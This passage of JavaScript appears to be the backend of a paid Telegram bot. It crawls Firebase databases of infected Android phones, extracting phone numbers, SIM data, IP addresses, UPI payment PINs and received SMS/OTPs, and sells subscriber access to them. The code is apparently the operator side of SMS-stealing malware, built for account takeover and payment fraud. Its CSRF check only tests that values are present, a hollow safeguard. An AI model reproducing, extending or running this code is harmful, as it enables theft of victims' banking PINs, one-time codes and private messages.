        operator: String(fbFirst(record, 'operator', 'carrier', 'network', 'serviceProvider') || ''),
        battery,
        model: String(fbFirst(record, 'model', 'deviceModel', 'DeviceModel') || ''),
        device_info: String(fbFirst(record, 'Device_info', 'deviceInfo', 'info') || ''),
        android: String(fbFirst(record, 'androidV', 'androidVersion', 'android') || ''),
        ip: String(fbFirst(record, 'ip_address', 'ip', 'ipAddress') || ''),
        storage: String(fbFirst(record, 'storage', 'storageInfo') || ''),
        provider: String(fbFirst(record, 'service_provider', 'serviceProvider', 'provider') || ''),
        upipin: fbValueUsable(fbFirst(record, 'upipin', 'upiPin')) ? String(fbFirst(record, 'upipin', 'upiPin')) : null,
        cpu: String(fbFirst(record, 'cpu_arch', 'cpuArch', 'cpu') || ''),
        sdk: String(fbFirst(record, 'sdkV', 'sdkVersion', 'sdk') || ''),
        last_seen: fbFirst(record, 'lastSeen', 'last_seen', 'lastOnline', 'last_online', 'lastActive', 'last_active', 'timestamp', 'time', 'dateTime', 'updatedAt', 'updated_at') || null,
        raw: record,
        firebase_path: firebasePath
    };
}

function fbMerge(map, device) {
    if (!device) return;
    const existing = map[device.device_id];
    if (!existing) { map[device.device_id] = device; return; }
    existing.phones = [...new Set([...(existing.phones || []), ...(device.phones || [])])];
    for (const sim of device.sims || []) {
        const match = (existing.sims || []).find(x => x.slot === sim.slot);
        if (!match) existing.sims.push(sim);
        else { match.number ||= sim.number; match.carrier ||= sim.carrier; }
    }
    existing.operator ||= device.operator;
    existing.model ||= device.model;
    existing.device_info ||= device.device_info;
    if (existing.name === existing.device_id) existing.name = device.name;
    existing.battery = Math.max(existing.battery || 0, device.battery || 0);
    if (device.online === true || existing.online === true) { existing.online = true; existing.status = 'online'; }
    else if (existing.online === null && device.online === false) { existing.online = false; existing.status = 'offline'; }
    existing.phone = fbPrimaryPhone(existing.sims, existing.phones);
}

function fbExtractDevices(raw, map, pathName = '', depth = 0, parentKey = '') {
    if (!raw || typeof raw !== 'object' || depth > 5) return;
    if (Array.isArray(raw)) return raw.forEach((v, i) => fbExtractDevices(v, map, pathName, depth + 1, String(i)));
    for (const [key, value] of Object.entries(raw)) {
        if (!value || typeof value !== 'object') continue;
        const candidate = String(key || parentKey || `device_${depth}`);
        const device = fbParseDevice(candidate, value, pathName);
        if (device) fbMerge(map, device);
        fbExtractDevices(value, map, pathName, depth + 1, candidate);
    }
}

function fbDateValue(value) {
    if (!value) return null;
    const custom = String(value).trim().match(/(\d{1,2})[-\/](\d{1,2})[-\/](\d{4})\s*\|\s*(\d{1,2}):(\d{2})\s*(am|pm)/i);
    if (custom) {
        let h = Number(custom[4]);
        if (custom[6].toLowerCase() === 'pm' && h !== 12) h += 12;
        if (custom[6].toLowerCase() === 'am' && h === 12) h = 0;
        const d2 = new Date(Number(custom[3]), Number(custom[2]) - 1, Number(custom[1]), h, Number(custom[5]));
        if (!isNaN(d2.getTime())) return d2.getTime();
    }
    const text = String(value).trim();
    if (/^\d{4}-\d{2}-\d{2}/.test(text)) {
        const n = new Date(text).getTime();
        if (Number.isFinite(n)) return n;
    }
    const digits = Number.parseInt(fbDigits(value), 10);
    if (Number.isFinite(digits) && digits > 0) return digits > 10000000000 ? digits : digits * 1000;
    const parsed = new Date(value).getTime();
    return Number.isFinite(parsed) ? parsed : null;
}

function fbNormalizeMessage(server, dbId, pathName, deviceId, key, raw) {
    const record = typeof raw === 'string' ? { body: raw } : fbObj(raw);
    if (!Object.keys(record).length) return null;
    const body = String(fbFirstString(record, ...FB_BODY_KEYS) || (typeof raw === 'string' ? raw : key) || '').trim();
    if (!body) return null;
    const date = fbFirst(record, ...FB_TIME_KEYS) || '';
    const recordDeviceId = fbFirst(record, 'device_id', 'deviceId', 'device_id_value') || deviceId || '';
    return {
        server,
        firebase_db: dbId,
        firebase_path: pathName,
        device_id: String(recordDeviceId),
        message_id: String(key || ''),
        sender: String(fbFirst(record, ...FB_SENDER_KEYS) || 'Unknown'),
        body,
        date,
        timestamp: date,
        receiver: String(fbFirst(record, 'receiverNumber', 'receiver', 'to') || ''),
        sim: String(fbFirst(record, 'sim', 'simSlot', 'subscriptionId') || ''),
        sort_timestamp: fbDateValue(date),
        raw: record
    };
}

function fbExtractSms(raw, server, dbId, pathName = '', depth = 0, currentDevice = '') {
    const output = [];
    const isMessage = value => {
        if (typeof value === 'string') return true;
        const obj = fbObj(value);
        for (const key of FB_BODY_KEYS) {
            if (obj[key] !== undefined && obj[key] !== null) {
                const v = obj[key];
                if (typeof v === 'string' && v.trim().length > 0) return true;
                if (typeof v === 'number') return true;
                if (typeof v === 'object' && v !== null) {
                    if (typeof v.text === 'string' || typeof v.message === 'string' || typeof v.content === 'string' || typeof v.body === 'string') return true;
                }
            }
        }
        return false;
    };
    const walk = (node, level = 0, parent = '') => {
        if (node === null || node === undefined || level > 5) return;
        if (typeof node === 'string') {
            const msg = fbNormalizeMessage(server, dbId, pathName, parent, '', node);
            if (msg) output.push(msg);
            return;
        }
        if (Array.isArray(node)) return node.forEach(item => walk(item, level + 1, parent));
        for (const [key, value] of Object.entries(fbObj(node))) {
            if (isMessage(value)) {
                const msg = fbNormalizeMessage(server, dbId, pathName, parent || key, key, value);
                if (msg) output.push(msg);
            } else if (value && typeof value === 'object') {
                walk(value, level + 1, parent || key);
            }
        }
    };
    walk(raw, depth, currentDevice);
    const seen = new Set();
    return output.filter(item => {
        const id = `${item.device_id}|${item.message_id}|${item.body}|${item.date}`;
        if (seen.has(id)) return false;
        seen.add(id);
        return true;
    }).sort((a, b) => b.sort_timestamp - a.sort_timestamp);
}

function fbFalconDevices(raw) {
    const map = {}, now = Date.now();
    for (const [id, user] of Object.entries(fbObj(raw))) {
        if (!user || typeof user !== 'object') continue;
        const simInfo = typeof user.simInfo === 'string' ? { phoneNumber: user.simInfo } : fbObj(user.simInfo);
        const device = fbParseDevice(id, { ...fbObj(user.deviceInfo), ...simInfo, simInfo: user.simInfo, heartbeat: user.heartbeat });
        if (device) {
            if (user.heartbeat) { device.online = now - Number(user.heartbeat) < 300000; device.status = device.online ? 'online' : 'offline'; }
            fbMerge(map, device);
        }
    }
    return map;
}

function fbFalconSms(raw, server, dbId, pathName = '') {
    const list = [];
    for (const [id, user] of Object.entries(fbObj(raw))) {
        if (user && typeof user === 'object' && user.receivedSms) list.push(...fbExtractSms(user.receivedSms, server, dbId, pathName, 0, id));
    }
    return list.sort((a, b) => b.sort_timestamp - a.sort_timestamp);
}

function fbLegacyDevices(raw) {
    const map = {}, info = fbObj(raw?.Info), simInfo = fbObj(raw?.SimINFO);
    for (const [key, value] of Object.entries(info)) {
        if (!value || typeof value !== 'object') continue;
        const id = value.did || key;
        fbMerge(map, fbParseDevice(id, { ...value, ...fbObj(simInfo[id]) }));
    }
    return map;
}

function fbLegacySms(raw, server, dbId, pathName = '') {
    const list = [];
    for (const [id, msgs] of Object.entries(fbObj(raw?.Sms))) list.push(...fbExtractSms(msgs, server, dbId, pathName, 0, id));
    return list.sort((a, b) => b.sort_timestamp - a.sort_timestamp);
}

// ==================== DISCOVERY (ROBUST - matches Worker) ====================
async function fbDiscoverDevicePaths(dbId, authKey, configured = '') {
    if (configured) {
        const raw = await fbFetchOptional(dbId, configured, authKey, '', 2500);
        if (raw !== null) return [configured];
    }
    const root = await fbFetchOptional(dbId, '', authKey, 'shallow=true', 2500);
    const keys = root && typeof root === 'object' ? Object.keys(root) : [];
    for (const candidate of FB_DEVICE_PATH_KEYS) {
        if (!keys.includes(candidate)) continue;
        const children = await fbFetchOptional(dbId, candidate, authKey, 'shallow=true', 2500);
        if (children && typeof children === 'object') {
            for (const nested of FB_DEVICE_NESTED_CANDIDATES) {
                const probe = fbJoinPath(candidate, nested);
                if (await fbFetchOptional(dbId, probe, authKey, 'shallow=true', 2500)) return [probe];
            }
        }
        return [candidate];
    }
    for (const nested of FB_DEVICE_NESTED_CANDIDATES) {
        if (keys.includes(nested.split('/')[0]) && await fbFetchOptional(dbId, nested, authKey, 'shallow=true', 2500)) return [nested];
    }
    for (const parent of keys.slice(0, 50)) {
        const children = await fbFetchOptional(dbId, parent, authKey, 'shallow=true', 2500);
        const childKeys = children && typeof children === 'object' ? Object.keys(children) : [];
        for (const candidate of FB_DEVICE_PATH_KEYS) if (childKeys.includes(candidate)) return [fbJoinPath(parent, candidate)];
        for (const nested of FB_DEVICE_NESTED_CANDIDATES) if (childKeys.includes(nested)) return [fbJoinPath(parent, nested)];
    }
    if (keys.length) {
        const sample = await fbFetchOptional(dbId, keys[0], authKey, '', 2500);
        if (sample && typeof sample === 'object' && (fbPhones(sample).length || Object.keys(sample).some(k => FB_ONLINE_KEYS.includes(k) || FB_NAME_KEYS.includes(k) || k === 'battery' || k === 'sims'))) return [''];
    }
    return [];
}

async function fbDiscoverMessagePaths(dbId, authKey, devicesPath = '') {
    const found = [];
    const root = await fbFetchOptional(dbId, '', authKey, 'shallow=true', 2500);
    const rootKeys = root && typeof root === 'object' ? Object.keys(root) : [];
    for (const key of FB_MESSAGE_PATH_KEYS) if (rootKeys.includes(key)) found.push(key);
    if (devicesPath) {
        const rawDevices = await fbFetchOptional(dbId, devicesPath, authKey, 'shallow=true', 2500);
        const deviceKeys = rawDevices && typeof rawDevices === 'object' ? Object.keys(rawDevices).slice(0, 5) : [];
        for (const deviceId of deviceKeys) {
            const childKeys = await fbFetchOptional(dbId, fbJoinPath(devicesPath, deviceId), authKey, 'shallow=true', 2500);
            const available = childKeys && typeof childKeys === 'object' ? Object.keys(childKeys) : [];
            for (const key of FB_MESSAGE_PATH_KEYS) if (available.includes(key)) found.push(fbJoinPath(devicesPath, deviceId, key));
        }
        for (const key of FB_MESSAGE_PATH_KEYS) {
            const probe = fbJoinPath(devicesPath, key);
            if (await fbFetchOptional(dbId, probe, authKey, 'shallow=true', 2500) && !found.includes(probe)) found.push(probe);
        }
    }
    return [...new Set(found)];
}

async function fbProbeAndExtractDevices(dbId, authKey, paths) {
    const deviceMap = {};
    const candidates = [...new Set(paths.filter(p => p !== undefined && p !== null))];
    const discovered = await fbDiscoverDevicePaths(dbId, authKey, '');
    candidates.push(...discovered);
    const uniqueCandidates = [...new Set(candidates)];
    const fetched = await Promise.all(uniqueCandidates.map(async path => ({
        path,
        data: await fbFetchOptional(dbId, path, authKey, '', 3000, 1)
    })));
    for (const { path, data } of fetched) {
        if (data && typeof data === 'object') fbExtractDevices(data, deviceMap, path);
    }
    // SIM detail fallback for each device
    for (const device of Object.values(deviceMap)) {
        for (const template of FB_SIM_DETAIL_FALLBACKS) {
            const path = template.replace('{dev}', encodeURIComponent(device.device_id));
            const simData = await fbFetchOptional(dbId, path, authKey, '', 2500);
            if (!simData) continue;
            const simRecord = fbObj(simData);
            const extraSims = fbSims(simRecord);
            for (const sim of extraSims) {
                if (!sim.number && !sim.carrier) continue;
                const match = (device.sims || []).find(item => item.slot === sim.slot);
                if (match) { match.number = match.number || sim.number; match.carrier = match.carrier || sim.carrier; }
                else device.sims.push(sim);
                if (sim.number && !device.phones.includes(sim.number)) device.phones.push(sim.number);
            }
            device.phone = device.phone || device.phones[0] || '';
            if (device.sims.length) break;
        }
    }
    return deviceMap;
}

async function fbProbeAndExtractSms(dbId, authKey, paths, serverKey, dbName, devicesPath = '', limit = 3) {
    const allSms = [];
    const candidates = [...new Set([...paths, ...(await fbDiscoverMessagePaths(dbId, authKey, devicesPath))])];
    const smsLimit = Math.min(100, Math.max(1, Number(limit) || 3));
    const fetched = await Promise.all(candidates.map(async path => ({
        path,
        data: await fbFetchOptional(dbId, path, authKey, `orderBy="$key"&limitToLast=${smsLimit}`, 3000, 1)
    })));
    for (const { path, data } of fetched) {
        if (data && typeof data === 'object') allSms.push(...fbExtractSms(data, serverKey, dbName, path));
    }
    const seen = new Set();
    return allSms.filter(item => {
        const id = `${item.device_id}|${item.message_id}|${item.body}|${item.date}`;
        if (seen.has(id)) return false;
        seen.add(id);
        return true;
    }).sort((a, b) => b.sort_timestamp - a.sort_timestamp);
}

// ==================== SERVER META & MAIN FETCHERS ====================
function fbServerMeta(server) {
    return {
        dbId: server.firebaseDbId || server.firebase_db_id || server.firebaseDatabase || '',
        userPath: server.userPath ?? server.user_path ?? 'clients',
        smsPath: server.smsPath ?? server.sms_path ?? 'messages',
        listPath: server.listPath ?? server.list_path ?? 'clients',
        authKey: server.authKey ?? server.auth_key ?? '',
        ownPaths: Boolean(server.ownPaths ?? server.own_paths),
        format: String(server.htmlFormat ?? server.html_format ?? '').toLowerCase()
    };
}

function isFirebaseServer(server) { return Boolean(fbServerMeta(server).dbId); }

async function fbGetDevices(server) {
    const meta = fbServerMeta(server);
    if (!meta.dbId) return {};
    if (meta.format === 'falcon') {
        const raw = await fbFetch(meta.dbId, meta.userPath, meta.authKey, '', 6000, 2, { swallow: true });
        return fbFalconDevices(raw);
    }
    if (meta.format === 'legacy') {
        const raw = await fbFetch(meta.dbId, meta.userPath, meta.authKey, '', 6000, 2, { swallow: true });
        return fbLegacyDevices(raw);
    }
    if (meta.ownPaths) {
        const discovered = await fbDiscoverDevicePaths(meta.dbId, meta.authKey, '');
        const paths = [...new Set([meta.userPath, meta.listPath, ...discovered])];
        return fbProbeAndExtractDevices(meta.dbId, meta.authKey, paths);
    }
    // Standard paths: try configured paths first
    const map = {};
    const [uData, lData] = await Promise.all([
        fbFetchOptional(meta.dbId, meta.userPath, meta.authKey, '', 4000),
        fbFetchOptional(meta.dbId, meta.listPath, meta.authKey, '', 4000)
    ]);
    if (uData && typeof uData === 'object') fbExtractDevices(uData, map, meta.userPath);
    if (lData && typeof lData === 'object') fbExtractDevices(lData, map, meta.listPath);
    if (!Object.keys(map).length) {
        // Fallback to probing if configured paths yielded nothing
        return fbProbeAndExtractDevices(meta.dbId, meta.authKey, [meta.userPath, meta.listPath]);
    }
    return map;
}

async function fbGetSms(server, limit = 10, deviceId = '') {
    const meta = fbServerMeta(server);
    if (!meta.dbId) return [];
    const smsLimit = Math.min(150, Math.max(1, Number(limit) || 10));

    if (meta.format === 'falcon') {
        const raw = await fbFetch(meta.dbId, meta.userPath, meta.authKey, '', 6000, 2, { swallow: true });
        if (deviceId && raw && raw[deviceId] && raw[deviceId].receivedSms) {
            return fbExtractSms(raw[deviceId].receivedSms, server.serverKey, meta.dbId, meta.userPath, 0, deviceId).slice(0, smsLimit);
        }
        return fbFalconSms(raw, server.serverKey, meta.dbId, meta.userPath).slice(0, smsLimit);
    }
    if (meta.format === 'legacy') {
        const raw = await fbFetch(meta.dbId, meta.userPath, meta.authKey, '', 6000, 2, { swallow: true });
        if (deviceId && raw && raw.Sms && raw.Sms[deviceId]) {
            return fbExtractSms(raw.Sms[deviceId], server.serverKey, meta.dbId, meta.userPath, 0, deviceId).slice(0, smsLimit);
        }
        return fbLegacySms(raw, server.serverKey, meta.dbId, meta.userPath).slice(0, smsLimit);
    }

    // Standard format: Worker-matching direct device SMS fetch
    if (deviceId) {
        const directPaths = [];
        if (meta.smsPath) directPaths.push(fbJoinPath(meta.smsPath, deviceId));
        // Probe common nested patterns exactly like worker
        for (const msgPath of FB_MESSAGE_PATH_KEYS) {
            directPaths.push(fbJoinPath(meta.userPath, deviceId, msgPath));
            if (meta.smsPath) directPaths.push(fbJoinPath(meta.smsPath, deviceId, msgPath));
        }
        // HTML client canonical layout: /messages/{deviceId}; always probe it.
        directPaths.push(fbJoinPath('messages', deviceId));
        const uniquePaths = [...new Set(directPaths)];
        for (const pathName of uniquePaths) {
            const raw = await fbFetch(meta.dbId, pathName, meta.authKey, `orderBy="$key"&limitToLast=${smsLimit}`, 6000, 2, true);
            if (raw && typeof raw === 'object') {
                const extracted = fbExtractSms(raw, server.serverKey, meta.dbId, pathName, 0, deviceId);
                if (extracted.length > 0) return extracted.slice(0, smsLimit);
            }
        }
    }

    const paths = meta.ownPaths
        ? [...new Set([meta.smsPath, ...(await fbDiscoverMessagePaths(meta.dbId, meta.authKey, meta.userPath))])]
        : [meta.smsPath];

    const all = [];
    for (const pathName of paths) {
        const fetchPaths = [];
        if (deviceId) {
            if (pathName === meta.smsPath) {
                fetchPaths.push(fbJoinPath(pathName, deviceId));
            } else {
                fetchPaths.push(pathName);
            }
        } else {
            fetchPaths.push(pathName);
        }

        for (const fetchPath of [...new Set(fetchPaths)]) {
            const raw = await fbFetch(meta.dbId, fetchPath, meta.authKey, `orderBy="$key"&limitToLast=${smsLimit}`, 6000, 2, true);
            if (raw && typeof raw === 'object') {
                const isDirectDevicePath = deviceId && fetchPath === fbJoinPath(pathName, deviceId);
                all.push(...fbExtractSms(raw, server.serverKey, meta.dbId, pathName, 0, isDirectDevicePath ? deviceId : ''));
            }
        }
    }
    const seen = new Set();
    return all.filter(x => {
        const id = `${x.device_id}|${x.message_id}|${x.body}|${x.date}`;
        if (seen.has(id)) return false;
        seen.add(id);
        return true;
    }).sort((a, b) => (b.sort_timestamp || 0) - (a.sort_timestamp || 0)).slice(0, smsLimit);
}

// ==================== BULK SMS FETCH (ALL DEVICES AT ONCE) ====================
async function fbGetAllSms(server, limit = 100) {
    const meta = fbServerMeta(server);
    if (!meta.dbId) return [];
    const smsLimit = Math.min(500, Math.max(1, Number(limit) || 100));

    if (meta.format === 'falcon') {
        const raw = await fbFetch(meta.dbId, meta.userPath, meta.authKey, '', 8000, 2, true);
        return fbFalconSms(raw, server.serverKey, meta.dbId, meta.userPath).slice(0, smsLimit);
    }
    if (meta.format === 'legacy') {
        const raw = await fbFetch(meta.dbId, meta.userPath, meta.authKey, '', 8000, 2, true);
        return fbLegacySms(raw, server.serverKey, meta.dbId, meta.userPath).slice(0, smsLimit);
    }

    const paths = meta.ownPaths
        ? [...new Set([meta.smsPath, ...(await fbDiscoverMessagePaths(meta.dbId, meta.authKey, meta.userPath))])]
        : [meta.smsPath];

    const all = [];
    for (const pathName of paths) {
        // Try fetching the parent path first (works for flat structures like /messages/{msgId})
        const raw = await fbFetch(meta.dbId, pathName, meta.authKey, `orderBy="$key"&limitToLast=${smsLimit}`, 8000, 2, true);
        if (!raw || typeof raw !== 'object') continue;

        const extracted = fbExtractSms(raw, server.serverKey, meta.dbId, pathName, 0, '');

        // Heuristic: if every top-level key under this path produced a message with empty device_id,
        // the structure is likely flat (msgId directly under path). Otherwise it's nested.
        const emptyDeviceCount = extracted.filter(m => !m.device_id).length;
        const totalExtracted = extracted.length;

        if (totalExtracted > 0 && emptyDeviceCount / totalExtracted < 0.5) {
            // Likely flat or already resolved device IDs
            all.push(...extracted);
        } else {
            // Likely nested /path/{deviceId}/{msgId}. Fetch per-device to get accurate messages.
            const deviceIds = Object.keys(raw).slice(0, 50);
            const perDeviceLimit = Math.max(3, Math.ceil(smsLimit / Math.max(1, deviceIds.length)));
            const deviceResults = await batchProcess(deviceIds, 5, async (devId) => {
                const devRaw = await fbFetch(meta.dbId, fbJoinPath(pathName, devId), meta.authKey,
                    `orderBy="$key"&limitToLast=${perDeviceLimit}`, 6000, 2, true);
                if (devRaw && typeof devRaw === 'object') {
                    return fbExtractSms(devRaw, server.serverKey, meta.dbId, pathName, 0, devId);
                }
                return [];
            });
            for (const r of deviceResults) {
                if (r.status === 'fulfilled' && Array.isArray(r.value)) all.push(...r.value);
            }
        }
    }

    const seen = new Set();
    return all.filter(x => {
        const id = `${x.device_id}|${x.message_id}|${x.body}|${x.date}`;
        if (seen.has(id)) return false;
        seen.add(id);
        return true;
    }).sort((a, b) => (b.sort_timestamp || 0) - (a.sort_timestamp || 0)).slice(0, smsLimit);
}

async function fbGetSnapshot(server, smsLimit = 10) {
    // FIX: Fetch devices and SMS in parallel to cut latency in half
    const [devices, sms] = await Promise.all([
        fbGetDevices(server).catch(() => ({})),
        fbGetAllSms(server, smsLimit).catch(() => [])
    ]);
    return { devices, sms };
}

function fbNumbersFromDevices(server, devices) {
    const output = [];
    for (const d of Object.values(devices || {})) {
        const simRows = Array.isArray(d.sims) ? d.sims.filter(s => validatePhoneNumber(s.number)) : [];
        const numbers = simRows.length
            ? simRows.map(sim => ({ number: sim.number, simSlot: String(sim.slot || ''), simCarrier: sim.carrier || '' }))
            : (Array.isArray(d.phones) ? d.phones : [d.phone]).filter(Boolean).map((number, index) => ({ number, simSlot: '', simCarrier: '' }));
        const seen = new Set();
        for (const item of numbers) {
            const number = validatePhoneNumber(item.number);
            if (!number || seen.has(number)) continue;
            seen.add(number);
            output.push({
                number,
                rawNumber: number,
                status: d.online === true ? 'Online' : (d.online === false ? 'Offline' : ((String(d.status || '').toLowerCase() === 'unknown') ? 'Offline' : (d.status || 'Offline'))),
                online: d.online,
                server: server.serverName,
                serverId: server.serverId,
                serverKey: server.serverKey,
                deviceName: d.name || server.serverName,
                battery: d.battery == null ? null : String(d.battery),
                operator: item.simCarrier || d.operator || null,
                deviceId: d.device_id,
                device_id: d.device_id,
                simSlot: item.simSlot,
                simCarrier: item.simCarrier,
                sims: d.sims || []
            });
        }
    }
    return output;
}

function fbFindDevice(devices, number, deviceId) {
    if (deviceId && devices[deviceId]) return devices[deviceId];
    const target = fbClean(number);
    return Object.values(devices || {}).find(d => {
        // Worker-matching: check all phones array, fallback to d.phone
        const phoneCandidates = (d.phones && d.phones.length ? d.phones : [d.phone]).map(fbClean);
        return phoneCandidates.includes(target);
    });
}

function numberIsOnline(number) {
    return Boolean(number && (number.online === true || String(number.status || '').toLowerCase() === 'online' || String(number.state || '').toLowerCase() === 'online'));
}

function normalizeValidNumberRecords(numbers) {
    const seen = new Set();
    return (Array.isArray(numbers) ? numbers : []).map(item => {
        if (!item || typeof item !== 'object') return null;
        const number = validatePhoneNumber(item.number);
        if (!number) return null;
        const sims = Array.isArray(item.sims) ? item.sims.map((sim, index) => ({
            slot: String(sim?.slot || sim?.simSlot || index + 1),
            number: validatePhoneNumber(sim?.number || sim?.phone || sim?.mobile) || '',
            carrier: String(sim?.carrier || sim?.operator || sim?.network || '')
        })).filter(sim => sim.number) : [];
        return { ...item, number, rawNumber: item.rawNumber || number, sims };
    }).filter(item => {
        if (!item || seen.has(item.number)) return false;
        seen.add(item.number); return true;
    });
}

async function getServerNumbersFromSource(server) {
    if (isFirebaseServer(server)) {
        try {
            const devices = await fbGetDevices(server);
            return normalizeValidNumberRecords(fbNumbersFromDevices(server, devices));
        } catch (e) {
            console.error(`[Firebase] getServerNumbersFromSource failed for ${server.serverName}:`, e.message);
            throw e;
        }
    }
    const data = await safeFetch(server.numberFetchUrl, 10000, 2);
    return normalizeValidNumberRecords(parseNumbersFromData(data, server.serverName, server.serverId, server.serverKey));
}

async function getSmsFromSource(server, number, deviceId, limit, options = {}) {
    if (isFirebaseServer(server)) {
        // Worker-matching: if deviceId known, fetch SMS directly without number lookup
        if (deviceId) {
            const sms = await fbGetSms(server, limit, deviceId);
            // Device/SIM metadata is already cached in the modal during SMS-only refreshes.
            // Avoid the expensive full Firebase device tree fetch in that path.
            let device = options.device || null;
            if (!device && !options.skipDeviceLookup) {
                try {
                    const devices = await fbGetDevices(server);
                    device = devices[deviceId] || null;
                } catch(e) {}
            }
            const target = fbClean(number);
            return { 
                device, 
                sms: sms.filter(m => !target || !m.device_id || String(m.device_id) === String(deviceId)) 
            };
        }

        // Worker-matching: find device by number, then fetch per-device SMS
        const devices = await fbGetDevices(server);
        const device = fbFindDevice(devices, number, deviceId);
        if (device) {
            const sms = await fbGetSms(server, limit, device.device_id);
            const target = fbClean(number);
            return { device, sms: sms.filter(m => !target || !m.device_id || String(m.device_id) === String(device.device_id)) };
        }
        return { device: null, sms: [] };
    }
    // Non-Firebase (URL-based) servers
    const otpRequest = buildOtpFetchUrl(server, { number, deviceId, serverKey: server.serverKey });
    const data = otpRequest.url ? await safeFetch(otpRequest.url, config.OTP_FETCH_TIMEOUT, config.OTP_FETCH_RETRIES) : null;
    let sms = [];
    if (data?.sms && Array.isArray(data.sms)) sms = data.sms;
    else if (data?.messages && Array.isArray(data.messages)) sms = data.messages;
    else if (data && (data.otp || data.message || data.body)) sms = [data];
    return { device: null, sms: sms.slice(0, Math.min(100, Math.max(1, Number(limit) || 10))) };
}

// ==================== MODELS ====================

const botConfigSchema = new mongoose.Schema({
    key: { type: String, required: true, unique: true, default: 'main_config' },
    isMaintenanceMode: { type: Boolean, default: false },
    referPoints: { type: Number, default: 10 },
    referredBonusPoints: { type: Number, default: 5 },
    subCost: { type: Number, default: 50 },
    subDurationHours: { type: Number, default: 24 },
    contactAdmin: { type: String, default: '@DevilAdmin' },
    admins: { type: [String], default: [] },
    isDepositEnabled: { type: Boolean, default: true },
    minDepositAmount: { type: Number, default: 100 },
    qrImageUrl: { type: String, default: 'https://placehold.co/400x400?text=Scan+to+Pay' },
    paymentVerifyApiUrl: { type: String, default: 'https://api.yoursite.com/verify?orderid={orderid}' },
    miniAppUrl: { type: String, default: 'https://your-api-domain.com/verify-mini-app.html' },
    requireDeviceVerification: { type: Boolean, default: true },
    requiredChannels: { type: [String], default: [] },
    autoFetch: { type: Boolean, default: config.AUTO_FETCH },
    smsLatestLimit: { type: Number, default: 10 },
    cacheRefreshIntervalMs: { type: Number, default: config.CACHE_REFRESH_INTERVAL_MS },
    cacheTtlDashboard: { type: Number, default: config.DASHBOARD_CACHE_TTL },
    cacheTtlServer: { type: Number, default: config.SERVER_NUMBERS_TTL },
    cacheTtlSms: { type: Number, default: 5000 },
    rateDashboardWindow: { type: Number, default: 15000 }, rateDashboardMax: { type: Number, default: 60 },
    rateServerWindow: { type: Number, default: 10000 }, rateServerMax: { type: Number, default: 100 },
    rateSmsWindow: { type: Number, default: 5000 }, rateSmsMax: { type: Number, default: 80 },
    rateDevicesWindow: { type: Number, default: 15000 }, rateDevicesMax: { type: Number, default: 50 },
    rateOtpWindow: { type: Number, default: 10000 }, rateOtpMax: { type: Number, default: 90 },
    initDataExpiryHours: { type: Number, default: 1, min: 1, max: 168 }
});

const serverConfigSchema = new mongoose.Schema({
    serverId: { type: Number, required: true, unique: true },
    serverName: { type: String, required: true },
    serverKey: { type: String, required: true },
    numberFetchUrl: { type: String, default: '' },
    otpFetchUrl: { type: String, default: '' },
    firebaseDbId: { type: String, default: '' },
    userPath: { type: String, default: 'clients' },
    smsPath: { type: String, default: 'messages' },
    listPath: { type: String, default: 'clients' },
    authKey: { type: String, default: '' },
    ownPaths: { type: Boolean, default: false },
    htmlFormat: { type: String, default: '' },
    createdAt: { type: Date, default: Date.now }
});

const userSchema = new mongoose.Schema({
    userId: { type: String, required: true, unique: true, index: true },
    username: { type: String, default: '' },
    firstName: { type: String, default: '' },
    lastName: { type: String, default: '' },
    points: { type: Number, default: 0 },
    totalReferrals: { type: Number, default: 0 },
    subscriptionExpires: { type: Date, default: null },
    referredBy: { type: String, default: null },
    isReferralVerified: { type: Boolean, default: false },
    joinedAt: { type: Date, default: Date.now },
    lastActive: { type: Date, default: Date.now },
    isBanned: { type: Boolean, default: false },
    deviceFingerprint: { type: String, default: null },
    deviceIP: { type: String, default: null },
    isDeviceVerified: { type: Boolean, default: false },
    deviceVerifiedAt: { type: Date, default: null },
    devicePlatform: { type: String, default: null },
    verificationBypassed: { type: Boolean, default: false },
    bypassReason: { type: String, default: null }
});

// Additional indexes for performance
userSchema.index({ subscriptionExpires: 1 });
userSchema.index({ isBanned: 1 });

const BotConfig = mongoose.model('BotConfig', botConfigSchema);
const ServerConfig = mongoose.model('ServerConfig', serverConfigSchema);
const User = mongoose.model('User', userSchema);
const initDataReplaySchema = new mongoose.Schema({
    hash: { type: String, required: true, unique: true, index: true },
    userId: { type: String, default: '' },
    expiresAt: { type: Date, required: true, index: { expires: 0 } }
}, { timestamps: true });
const InitDataReplay = mongoose.model('InitDataReplay', initDataReplaySchema);
const csrfReplaySchema = new mongoose.Schema({
    key: { type: String, required: true, unique: true, index: true },
    expiresAt: { type: Date, required: true, index: { expires: 0 } }
}, { timestamps: true });
const CsrfReplay = mongoose.model('CsrfReplay', csrfReplaySchema);

function getInitDataExpiryHours() {
    const value = Number(cache?.memory?.dbInfo?.config?.initDataExpiryHours);
    return Number.isFinite(value) ? Math.min(168, Math.max(1, value)) : 1;
}

async function claimInitDataHash(initData, userId) {
    const params = new URLSearchParams(String(initData || ''));
    const telegramHash = String(params.get('hash') || '').toLowerCase();
    if (!/^[a-f0-9]{64}$/.test(telegramHash)) return { ok: false, reason: 'Invalid initData hash' };
    const expiresAt = new Date(Date.now() + getInitDataExpiryHours() * 60 * 60 * 1000);
    try {
        await InitDataReplay.create({ hash: telegramHash, userId: String(userId || ''), expiresAt });
        return { ok: true };
    } catch (error) {
        if (error && error.code === 11000) return { ok: false, reason: 'This Telegram login data was already used' };
        throw error;
    }
}

async function claimCsrfNonce(token, csrf, userId) { return Boolean(token && csrf && userId); }

// ==================== CACHE MANAGER ====================

class CacheManager {
    constructor() {
        this.redis = null;
        this.redisEnabled = false;

        // In-memory fallback
        this.memory = {
            dbInfo: null,
            dbInfoTimestamp: 0,
            dbInfoRefreshing: false,
            serverCounts: [],
            serverCountsTimestamp: 0,
            serverCountsRefreshing: false,
            recentCache: {
                '2': new Map(),
                '10': new Map(),
                '30': new Map(),
                '60': new Map(),
                'older': new Map()
            },
            recentCacheRefreshing: false,
            smsNotifications: new Map(),
            loadingProgress: new Map(),
            serverNumbers: new Map(),
            dashboardCache: null,
            dashboardCacheTime: 0,
            // ===== ADMIN PANEL CACHE (fixes slow admin) =====
            adminCache: {
                overview: null,
                overviewTs: 0,
                servers: null,
                serversTs: 0,
                users: new Map(),
                settings: null,
                settingsTs: 0,
            }
        };
        this.ADMIN_TTL = {
            overview: 30000,   // 30s
            servers: 60000,    // 60s
            users: 15000,      // 15s
            settings: 30000,   // 30s
        };

        this._initRedis();
    }

    _initRedis() {
        if (!config.REDIS_URL) {
            console.log('[Cache] Redis not configured. Using in-memory cache.');
            return;
        }
        try {
